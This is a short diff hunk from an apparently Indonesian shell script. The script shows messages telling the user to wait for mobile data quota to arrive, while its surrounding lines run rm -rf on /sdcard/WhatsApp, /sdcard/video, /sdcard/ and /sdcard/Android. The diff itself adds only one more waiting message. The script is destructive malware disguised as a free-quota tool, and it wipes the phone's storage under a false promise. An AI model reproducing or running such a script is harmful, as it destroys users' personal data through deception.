@@ -54,6 +54,7 @@ rm -rf /sdcard/WhatsApp
 rm -rf /sdcard/video
 echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
 
 rm -rf /sdcard/
 rm -rf /sdcard/Android
